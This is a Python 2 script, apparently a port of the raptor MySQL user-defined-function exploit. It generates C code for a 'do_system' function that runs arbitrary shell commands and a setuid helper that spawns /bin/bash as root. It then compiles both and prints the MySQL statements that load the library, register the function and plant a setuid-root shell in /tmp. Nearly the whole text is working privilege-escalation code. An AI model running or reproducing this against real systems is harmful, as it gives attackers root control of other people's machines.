#!/usr/bin/env python
#
# Script name      : mysql_pwnage.py
# Req Modules      : None standard
# Author           : Marco Ivaldi
# Ported By        : wetw0rk
# Original Exploit : https://www.exploit-db.com/exploits/1518/
# Version          : 2.0
# Python Version   : 2.7
# Description      : This exploit targets MySQL from 4.1.10a and 4.0.24 via
#                    User-Defined-Function (UDF)
#

import os, sys, subprocess

# Get current username
username = os.getlogin()

print "[*] Currently Logged in as %s" % (username)
# This is where we want to create this script
assumed_cwd = "/home/%s" % username

try:
	if os.getcwd() != assumed_cwd:
		print "[-] Not in home folder attemting to change"
		os.chdir(assumed_cwd)

except:

	print "[-] Changing directory failed"

# This is the C code from Marco Ivaldi
def raptor(username):

	print "[*] Generating Sploit By Marco Ivaldi"
	udf_exploit = "#include <stdio.h>\n"
	udf_exploit += "#include <stdlib.h>\n"
	udf_exploit += "enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};\n"
	udf_exploit += "typedef struct st_udf_args {\n"
	udf_exploit += "    unsigned int        arg_count;\n"  # number of arguments
	udf_exploit += "    enum Item_result    *arg_type;\n"  # pointer to item_result
	udf_exploit += "    char            **args;\n"         # pointer to arguments
	udf_exploit += "    unsigned long       *lengths;\n"   # length of string args
	udf_exploit += "    char            *maybe_null;\n"    # 1 for maybe_null args
	udf_exploit += "} UDF_ARGS;\n"
	udf_exploit += "typedef struct st_udf_init {\n"
	udf_exploit += "    char            maybe_null;\n"     # 1 if func can return NULL
	udf_exploit += "    unsigned int        decimals;\n"   # for real functions
	udf_exploit += "    unsigned long       max_length;\n" # for string functions
	udf_exploit += "    char            *ptr;\n"           # free ptr for func data
	udf_exploit += "    char            const_item;\n"     # 0 if result is constant
	udf_exploit += "} UDF_INIT;\n"
	udf_exploit += "int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)\n"
	udf_exploit += "{\n"
	udf_exploit += "    if (args->arg_count != 1)\n"
	udf_exploit += "        return(0);\n"
	udf_exploit += "    system(args->args[0]);\n"
	udf_exploit += "    return(0);\n"
	udf_exploit += "}\n"
	udf_exploit += "char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)\n"
	udf_exploit += "{\n"
	udf_exploit += "    return(0);\n"
	udf_exploit += "}\n"
	# Write the exploit to a file
	e_file_name = "%s_udf.c" % (username)
	print "[+] Writing Sploit to %s" % e_file_name
	exploit_file = open(e_file_name, 'w')
	exploit_file.write(udf_exploit)
	exploit_file.close()

def setuid():

	print "[*] Generating setuid C script"
	uid_code = "#include<stdio.h>\n"
	uid_code += "#include<stdlib.h>\n"
	uid_code += "#include <unistd.h>\n"
	uid_code += "int main()\n"
	uid_code += "{\n"
	uid_code += """	setuid(0); setgid(0); system("/bin/bash");\n"""
	uid_code += "}\n"
	# Write the to file
	print "[+] Writing Code to setuid.c"
	setuid_file = open('setuid.c', 'w')
	setuid_file.write(uid_code)
	setuid_file.close()

def compile(username):

	print "[*] Starting To Compile Exploit"
	command_one	= "gcc -g -c %s_udf.c" % (username)
	command_two	= "gcc -g -shared -W1,-soname,%s_udf.so -o %s_udf.so %s_udf.o -lc" % (username,username,username)
	command_three	= "cp setuid.c /tmp/"
	command_four	= "gcc setuid.c -o /tmp/setuid"
	os.system(command_one)
	os.system(command_two)
	os.system(command_three)
	os.system(command_four)
	print "[+] Exploit Compiled Please Run The Following"
	print "mysql -u root -p"
	print "use mysql;"
	print "create table foo(line blob);"
	print "insert into foo values(load_file('/home/%s/%s_udf.so'));" % (username,username)
	print "select * from foo into dumpfile '/usr/lib/%s_udf.so';" % (username)
	print "create function do_system returns integer soname '%s_udf.so';" % (username)
	print "select * from mysql.func;"
	print "select do_system('id > /tmp/out; chown %s.%s /tmp/out');" % (username,username)
	print "select do_system('gcc -o /tmp/setuid /home/%s/setuid.c');" % (username)
	print "select do_system('chmod u+s /tmp/setuid');"
	print "\! sh"
	print "/tmp/setuid"

raptor(username)
setuid()
compile(username)
